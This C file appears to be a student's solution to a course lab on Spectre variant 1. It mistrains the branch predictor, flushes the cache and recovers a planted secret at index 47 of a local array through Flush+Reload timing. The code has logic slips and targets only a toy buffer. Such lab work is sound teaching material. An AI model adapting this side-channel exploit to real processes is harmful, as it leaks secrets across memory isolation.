#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)

#define SECRET_INDEX 47

//** Write your victim function here **
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
int limit = 20;
void victim_code(int* shared_mem, int offset){
	int secret_data = shared_mem[offset];
	int mem_ind = 4096 * secret_data;
	clflush(&limit);
	if(offset <= limit) {
		one_block_access(shared_mem + mem_ind);
	}
}


int main(int argc, char **argv)
{
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation


	int tries = 100;
	int time[100] = {0};
    //** STEP 1: Allocate an array into the mmap */
    int *secret_array = (int *)huge_page;

    // Initialize the array
    for (int i = 0; i < 100; i++) {
        secret_array[i] = i;
    }
	// set a secret value at index 47 to other number
	secret_array[SECRET_INDEX] = 88;
	
	for( int i = 0; i < BUFF_SIZE/sizeof(int); i++){
		clflush(&secret_array[i]);
	}
while(tries-- > 0){
    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times
	// randome train loop
	int train = tries-- ^ tries;
	while(train-- > 0) {
		for(int i = 0; i <= 20; i++){
			victim_code(secret_array, i);
		}
	}
	
    //** STEP 3: Clear cache using clflsuh from utility.h */
	for (int i = 0; i < BUFF_SIZE/sizeof(int); i++) {
        clflush(secret_array + i);
    }
    //** STEP 4: Call victim function again with bounds bypass value */
	victim_code(secret_array, SECRET_INDEX);
	
    //** STEP 5: Reload mmap to see load times */
    // Just read the mmap's first 100 integers
	for( int i = 0; i < 100; i++){
		time[i] += measure_one_block_access_time(&secret_array[i*4096]);
	}
	
}
	for(int i = 0 ;i < 100; i++){
		time[i] /= 100;
		if(time[i] < 50) printf("time[%d], secret: %d\n", i, secret_array[i]);
	}
    return 0;
}
